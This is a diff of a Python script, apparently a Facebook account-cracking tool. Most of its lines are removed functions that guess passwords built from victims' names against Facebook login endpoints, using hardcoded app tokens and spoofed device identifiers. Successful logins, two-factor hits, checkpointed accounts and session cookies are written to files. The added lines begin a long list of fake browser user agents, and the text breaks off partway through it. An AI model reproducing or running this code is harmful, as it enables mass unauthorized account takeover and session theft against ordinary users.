-                                'password':pas,
-                                'generate_analytics_claims':'1',
-                                'credentials_type':'password',
-                                'source':'login',
-                                'error_detail_type':'button_with_disabled',
-                                'enroll_misauth':'false',
-                                'generate_session_cookies':'1',
-                                'generate_machine_id':'1',
-                                'meta_inf_fbmeta':'',
-                                'currently_logged_in_userid':'0',
-                                'fb_api_req_friendly_name':'authenticate',
-                        }
-                        headers={
-                                'Authorization':f'OAuth {accessToken}',
-                                'X-FB-Friendly-Name':'authenticate',
-                                'X-FB-Connection-Type':'unknown',
-                                'User-Agent':ua,
-                                'Accept-Encoding':'gzip, deflate',
-                                'Content-Type': 'application/x-www-form-urlencoded',
-                                'X-FB-HTTP-Engine': 'Liger'
-                                }
-                        url = 'https://b-api.facebook.com/method/auth.login'
-                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-                        po = requests.post(url,data=data,headers=headers).json()
-                        if 'session_key' in po:
-                                        print('\r\r\033[1;32m [TRT-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/TRT-OK.txt','a').write(ids+'|'+pas+'\n')
-                                        oks.append(ids)
-                                        break
-                        elif twf in str(po):
-                                        if 'y' in pcp:
-                                                print('\r\r \033[1;34m[TRT-2F] '+ids+' | '+pas)
-                                                twf.append(ids)
-                                                break
-                        elif 'www.facebook.com' in po['error_msg']:
-                                        if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;206m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
-                                                break
-                                                cps.append(ids)
-                                        else:
-                                                open('/sdcard/TRT-CP.txt','a').write(ids+'|'+pas+'\n')
-                                                break
-                                                cps.append(ids)
-                        else:
-                                continue
-                loop+=1
-        except Exception as e:
-                pass
-#4method
-def api5(ids,names,passlist):
-        try:
-                global ok,loop,sim_id
-                sys.stdout.write('\r\r\033[1;37m [TRT-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-                fn = names.split(' ')[0]
-                try:
-                        ln = names.split(' ')[1]
-                except:
-                        ln = fn
-                for pw in passlist:
-                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
-                        accessToken = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-'438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',	'6628568379|c1e620fa708a1d5696fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']
-                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
-                        fbbv = str(random.randint(111111111,999999999))
-                        android_version = device['android_version']
-                        model = device['model']
-                        build = device['build']
-                        fblc = device['fblc']
-                        fbcr = sim_id
-                        fbmf = device['fbmf']
-                        fbbd = device['fbbd']
-                        fbdv = device['fbdv']
-                        fbsv = device['fbsv']
-                        fbca = device['fbca']
-                        fbdm = device['fbdm']
-                        fbfw = '1'
-                        fbrv = '0'
-                        fban = 'FB4A'
-                        fbpn = 'com.facebook.katana'
-                        en = random.choice(['en_US','en_GB'])
-                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
-                        en = random.choice(['en_US','en_GB'])
-                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
-                        ua = "Davik/2.1.0 (Linux; U; Android '+fbsv+'.0.0; '+model+' Build/'+''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))+' [FBAN/FB4A;FBAV/'+str(random.randint(111,555))+'.0.0.'+str(random.randrange(1,19))+'.'+str(random.randint(111,555))+';FBBV/'+str(random.randint(745000000,745999999))+';FBDM/{density=2.25,width=720,height=1452};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.adsmanager;FBDV/'+model+';FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"
-                        random_seed = random.Random()
-                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
-                        device_id = str(uuid.uuid4())
-                        secure = str(uuid.uuid4())
-                        family = str(uuid.uuid4())
-                        accessToken = ['350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-'438142079694454|fc0a7caa49b192f64f6f5a6d9643bb28',	'6628568379|c1e620fa708a1d5696fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']
-                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
-                        sim_serials = f'["{xd}"]'
-                        li = ['28','29','210']
-                        li2 = random.choice(li)
-                        j1 = ''.join(random.choice(digits) for _ in range(2))
-                        jazoest = li2+j1
-                        data = {
-                                "adid": adid,
-"format": "json",
-"device_id": str(uuid.uuid4()),
-"cpl": "true",
-"family_device_id": str(uuid.uuid4()),
-"credentials_type": "device_based_login_password",
-"error_detail_type": "button_with_disabled",
-"source": "device_based_login",
-"email": ids,
-"password": pas,
-"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-"generate_session_cookies": "1",
-"meta_inf_fbmeta": "",
-"advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
-"currently_logged_in_userid": "0",
-"locale": "en_US",
-"client_country_code": "US",
-"method": "auth.login",
-"fb_api_req_friendly_name": "authenticate",
-"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-"api_key": "882a8490361da98702bf97a021ddc14d",}
-                        headers={
-                                'User-Agent': ua,
-'Content-Type': 'application/x-www-form-urlencoded',
-'Host': 'graph.facebook.com',
-'X-FB-Net-HNI': '25227',
-'X-FB-SIM-HNI': '29752',
-'X-FB-Connection-Type': 'MOBILE.LTE',
-'X-Tigon-Is-Retry': 'False',
-'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-'x-fb-device-group': '5120',
-'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-'X-FB-Request-Analytics-Tags': 'graphservice',
-'X-FB-HTTP-Engine': 'Liger',
-'X-FB-Client-IP': 'True',
-'X-FB-Server-Cluster': 'True',
-'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
-'Content-Length': '706'}
-                        url = 'https://b-graph.facebook.com/auth/login'
-                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-                        po = requests.post(url,data=data,headers=headers).json()
-                        if 'session_key' in po:
-                                        print('\r\r\033[1;32m [SK-OK] '+ids+' | '+pas+'\033[1;97m')
-                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
-                                        #print("\r\r\033[1;33m Cookie: "+coki)
-                                        open('/sdcard/SK-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
-                                        open('/sdcard/SK-OK.txt','a').write(ids+'|'+pas+'\n')
-                                        oks.append(ids)
-                                        break
-                        elif twf in str(po):
-                                        if 'y' in pcp:
-                                                print('\r\r \033[1;34m[SK-2F] '+ids+' | '+pas)
-                                                twf.append(ids)
-                                                break
-                        elif 'www.facebook.com' in po['error']['message']:
-                                        if 'y' in pcp:
-                                                print('\r\r\x1b[38;5;205m [SK-CP] '+ids+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/SK-CP.txt','a').write(ids+'|'+pas+'\n')
-                                                break
-                                                cps.append(ids)
-                                        else:
-                                                open('/sdcard/SK-CP.txt','a').write(ids+'|'+pas+'\n')
-                                                break
-                                                cps.append(ids)
-                        else:
-                                        continue
-                loop+=1
-        except Exception as e:
-                pass
-def api6(ids,names,passlist):
-	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m [SK-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-	session = requests.Session()
-	try:
-		first = names.split(' ')[0]
-		try:
-			last = names.split(' ')[1]
-		except:
-			last = 'Khan'
-		ps = first.lower()
-		ps2 = last.lower()
-		for fikr in passlist:
-			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
-			ua=random.choice(ugen)
-			head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
-			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			TRT=session.cookies.get_dict().keys()
-			if "c_user" in TRT:
-				coki=session.cookies.get_dict()
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [SK-OK] %s | %s'%(ids,pas))
-				open('/sdcard/SK--OK.txt', 'a').write(ids+'|'+pas+'\n')
-				oks.append(ids)
-				break
-			elif 'checkpoint' in TRT:
-				if 'y' in pcp:
-					print('\r\r\x1b[38;5;205m [SK-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/SK-CP.txt', 'a').write(ids+'|'+pas+'\n')
-					cps.append(ids)
-					break
-				else:
-					break
-			else:
-				continue
-	except requests.exceptions.ConnectionError:
-		time.sleep(20)
-	loop+=1
-#method6
-#d.fb
-def api7(ids,names,passlist):
-	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m [TRT-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-	session = requests.Session()
-	try:
-		first = names.split(' ')[0]
-		try:
-			last = names.split(' ')[1]
-		except:
-			last = 'Khan'
-		ps = first.lower()
-		ps2 = last.lower()
-		for fikr in passlist:
-			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
-			ua=random.choice(ugen)
-			head = {'Host': 'd.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
-			getlog = session.get(f'https://d.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://d.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-			complete = session.post('https://d.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			TRT=session.cookies.get_dict().keys()
-			if "c_user" in TRT:
-				coki=session.cookies.get_dict()
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [SK--OK] %s | %s'%(ids,pas))
-				open('/sdcard/SK-OK.txt', 'a').write(ids+'|'+pas+'\n')
-				oks.append(ids)
-				break
-			elif 'checkpoint' in TRT:
-				if 'y' in pcp:
-					print('\r\r\x1b[38;5;205m [TRT-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/TRT-CP.txt', 'a').write(ids+'|'+pas+'\n')
-					cps.append(ids)
-					break
-				else:
-					break
-			else:
-				continue
-	except requests.exceptions.ConnectionError:
-		time.sleep(20)
-	loop+=1
-#method7
-def api8(ids,names,passlist):
-	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m [TRT-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-	session = requests.Session()
-	try:
-		first = names.split(' ')[0]
-		try:
-			last = names.split(' ')[1]
-		except:
-			last = 'Khan'
-		ps = first.lower()
-		ps2 = last.lower()
-		for fikr in passlist:
-			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
-			ua=random.choice(ugen)
-			head = {'Host': 'free.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
-			getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
-			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://free.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-			complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
-			TRT=session.cookies.get_dict().keys()
-			if "c_user" in TRT:
-				coki=session.cookies.get_dict()
-				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-				print('\r\r\033[1;32m [SK-OK] %s | %s'%(ids,pas))
-				open('/sdcard/SK-OK.txt', 'a').write(ids+'|'+pas+'\n')
-				oks.append(ids)
-				break
-			elif 'checkpoint' in TRT:
-				if 'y' in pcp:
-					print('\r\r\x1b[38;5;205m [SK-CP] '+ids+' | '+pas+'\033[1;97m')
-					open('/sdcard/SK-CP.txt', 'a').write(ids+'|'+pas+'\n')
-					cps.append(ids)
-					break
-				else:
-					break
-			else:
-				continue
-	except requests.exceptions.ConnectionError:
-		time.sleep(20)
-	loop+=1
-#method1rnd
-def trt1(ids,passlist):
-        global loop
-        global oks
-        sys.stdout.write('\r\r\033[1;37m [TRT-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-        try:
-                for pas in passlist:
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
-                        fbbv = str(random.randint(111111111,999999999))
-                        android_version = device['android_version']
-                        model = device['model']
-                        build = device['build']
-                        fblc = device['fblc']
-                        fbcr = sim_id
-                        fbmf = device['fbmf']
-                        fbbd = device['fbbd']
-                        fbdv = device['fbdv']
-                        fbsv = device['fbsv']
-                        fbca = device['fbca']
-                        fbdm = device['fbdm']
-                        fbfw = '1'
-                        fbrv = '0'
-                        fban = 'FB4A'
-                        fbpn = 'com.facebook.katana'
-                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.97,width=720,height=1612};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
-                        random_seed = random.Random()
-                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
-                        device_id = str(uuid.uuid4())
-                        secure = str(uuid.uuid4())
-                        family = str(uuid.uuid4())
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
-                        sim_serials = f'["{xd}"]'
-                        li = ['28','29','210']
-                        li2 = random.choice(li)
-                        j1 = ''.join(random.choice(digits) for _ in range(2))
-                        jazoest = li2+j1
-                        data = {
-                                "adid": adid,
-"format": "json",
-"device_id": str(uuid.uuid4()),
-"cpl": "true",
-"family_device_id": str(uuid.uuid4()),
-"credentials_type": "device_based_login_password",
-"error_detail_type": "button_with_disabled",
-"source": "device_based_login",
-"email": ids,
-"password": pas,
-"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-"generate_session_cookies": "1",
-"meta_inf_fbmeta": "",
-"advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
-"currently_logged_in_userid": "0",
-"locale": "en_US",
-"client_country_code": "US",
-"method": "auth.login",
-"fb_api_req_friendly_name": "authenticate",
-"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-"api_key": "882a8490361da98702bf97a021ddc14d",}
-                        headers={
-                                'User-Agent': ua,
-'Content-Type': 'application/x-www-form-urlencoded',
-'Host': 'graph.facebook.com',
-'X-FB-Net-HNI': '45204',
-'X-FB-SIM-HNI': '45201',
-'X-FB-Connection-Type': 'MOBILE.LTE',
-'X-Tigon-Is-Retry': 'False',
-'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
-'x-fb-device-group': '5120',
-'X-FB-Friendly-Name': 'ViewerReactionsMutation',
-'X-FB-Request-Analytics-Tags': 'graphservice',
-'X-FB-HTTP-Engine': 'Liger',
-'X-FB-Client-IP': 'True',
-'X-FB-Server-Cluster': 'True',
-'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
-'Content-Length': '698'}
-                        url = 'https://b-graph.facebook.com/auth/login'
-                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-                        po = requests.post(url,data=data,headers=headers).json()
-                        if 'session_key' in po:
-                                try:
-                                        uid = po['uid']
-                                except:
-                                        uid = ids
-                                if str(uid) in oks:
-                                        break
-                                else:
-                                        print('\r\r\033[1;32m [SK-OK] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/SK-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
-                                        oks.append(str(uid))
-                                        break
-                        elif 'www.facebook.com' in po['error']['message']:
-                                try:
-                                        uid = po['error']['error_data']['uid']
-                                except:
-                                        uid = ids
-                                if uid in oks:pass
-                                else:
-                                        print('\r\r\x1b[38;5;205m [SK-CP] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        open('/sdcard/SK-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
-                                        cps.append(str(ids))
-                                        break
+                for ps in pasx:
+                        agents = ['Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Y929Y) AppleWebKit/537.36 (KHTML, like Gecko)116.0.4865.37 Chrome/174.0.1.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)K183K) AppleWebKit/537.36 (KHTML, like Gecko)126.0.4960.73 Chrome/137.0.3.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)U383U) AppleWebKit/537.36 (KHTML, like Gecko)141.0.4503.71 Chrome/173.0.5.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)D864D) AppleWebKit/537.36 (KHTML, like Gecko)134.0.4615.90 Chrome/137.0.2.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)P394P) AppleWebKit/537.36 (KHTML, like Gecko)109.0.4856.74 Chrome/108.0.3.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)U350U) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4762.40 Chrome/166.0.1.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)O593O) AppleWebKit/537.36 (KHTML, like Gecko)147.0.4842.51 Chrome/99.0.4.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Q771Q) AppleWebKit/537.36 (KHTML, like Gecko)147.0.4858.49 Chrome/137.0.2.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)J721J) AppleWebKit/537.36 (KHTML, like Gecko)135.0.4788.58 Chrome/161.0.0.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)V527V) AppleWebKit/537.36 (KHTML, like Gecko)118.0.4609.98 Chrome/143.0.1.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)B516B) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4662.79 Chrome/169.0.0.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)W601W) AppleWebKit/537.36 (KHTML, like Gecko)147.0.4861.91 Chrome/110.0.1.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)H131H) AppleWebKit/537.36 (KHTML, like Gecko)134.0.4596.88 Chrome/118.0.5.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)B741B) AppleWebKit/537.36 (KHTML, like Gecko)143.0.4679.48 Chrome/157.0.1.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)X561X) AppleWebKit/537.36 (KHTML, like Gecko)135.0.4996.72 Chrome/130.0.4.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)H80H) AppleWebKit/537.36 (KHTML, like Gecko)113.0.4604.82 Chrome/127.0.2.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)A10A) AppleWebKit/537.36 (KHTML, like Gecko)140.0.4735.90 Chrome/167.0.2.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)J775J) AppleWebKit/537.36 (KHTML, like Gecko)129.0.4502.46 Chrome/164.0.1.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)K740K) AppleWebKit/537.36 (KHTML, like Gecko)132.0.4785.79 Chrome/103.0.2.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)R816R) AppleWebKit/537.36 (KHTML, like Gecko)119.0.4977.63 Chrome/136.0.5.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)E68E) AppleWebKit/537.36 (KHTML, like Gecko)108.0.4557.53 Chrome/142.0.1.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)O330O) AppleWebKit/537.36 (KHTML, like Gecko)123.0.4702.85 Chrome/140.0.3.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)O197O) AppleWebKit/537.36 (KHTML, like Gecko)118.0.4728.46 Chrome/129.0.1.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Y669Y) AppleWebKit/537.36 (KHTML, like Gecko)109.0.4691.42 Chrome/116.0.4.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)M480M) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4651.94 Chrome/152.0.5.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Z196Z) AppleWebKit/537.36 (KHTML, like Gecko)148.0.4842.45 Chrome/133.0.5.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)Z671Z) AppleWebKit/537.36 (KHTML, like Gecko)143.0.4722.56 Chrome/104.0.2.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)O429O) AppleWebKit/537.36 (KHTML, like Gecko)142.0.4793.44 Chrome/116.0.5.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)B895B) AppleWebKit/537.36 (KHTML, like Gecko)147.0.4903.78 Chrome/102.0.1.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)J843J) AppleWebKit/537.36 (KHTML, like Gecko)104.0.4535.56 Chrome/103.0.2.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)O984O) AppleWebKit/537.36 (KHTML, like Gecko)105.0.4682.92 Chrome/112.0.3.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)A412A) AppleWebKit/537.36 (KHTML, like Gecko)125.0.4965.96 Chrome/130.0.5.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)B457B) AppleWebKit/537.36 (KHTML, like Gecko)123.0.4858.83 Chrome/173.0.3.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)D498D) AppleWebKit/537.36 (KHTML, like Gecko)100.0.4609.98 Chrome/168.0.4.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)L364L) AppleWebKit/537.36 (KHTML, like Gecko)128.0.4524.91 Chrome/124.0.5.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)L428L) AppleWebKit/537.36 (KHTML, like Gecko)144.0.4741.98 Chrome/111.0.5.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)S639S) AppleWebKit/537.36 (KHTML, like Gecko)122.0.4667.35 Chrome/104.0.4.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Y894Y) AppleWebKit/537.36 (KHTML, like Gecko)145.0.4587.50 Chrome/172.0.4.0 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)J349J) AppleWebKit/537.36 (KHTML, like Gecko)119.0.4930.56 Chrome/144.0.5.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)R215R) AppleWebKit/537.36 (KHTML, like Gecko)147.0.4879.79 Chrome/110.0.1.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)X78X) AppleWebKit/537.36 (KHTML, like Gecko)114.0.4696.42 Chrome/164.0.3.4 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)B571B) AppleWebKit/537.36 (KHTML, like Gecko)130.0.4616.58 Chrome/162.0.3.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)T960T) AppleWebKit/537.36 (KHTML, like Gecko)101.0.4614.92 Chrome/110.0.0.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)R220R) AppleWebKit/537.36 (KHTML, like Gecko)116.0.4586.89 Chrome/144.0.0.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)A260A) AppleWebKit/537.36 (KHTML, like Gecko)147.0.4952.48 Chrome/173.0.2.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)C365C) AppleWebKit/537.36 (KHTML, like Gecko)144.0.4671.54 Chrome/170.0.3.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)P681P) AppleWebKit/537.36 (KHTML, like Gecko)122.0.4674.84 Chrome/113.0.2.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)J469J) AppleWebKit/537.36 (KHTML, like Gecko)134.0.4821.53 Chrome/139.0.4.5 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)M714M) AppleWebKit/537.36 (KHTML, like Gecko)99.0.4746.39 Chrome/161.0.4.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 11; Win64; x64)K642K) AppleWebKit/537.36 (KHTML, like Gecko)139.0.4859.66 Chrome/137.0.3.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)F880F) AppleWebKit/537.36 (KHTML, like Gecko)103.0.4616.41 Chrome/159.0.1.1 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)E544E) AppleWebKit/537.36 (KHTML, like Gecko)147.0.4960.79 Chrome/161.0.2.2 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 9; Win64; x64)Z970Z) AppleWebKit/537.36 (KHTML, like Gecko)136.0.4524.40 Chrome/138.0.4.3 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; 10; Win64; x64)N827N) AppleWebKit/537.36 (KHTML, like Gecko)138.0.4842.77 Chrome/175.0.3.2 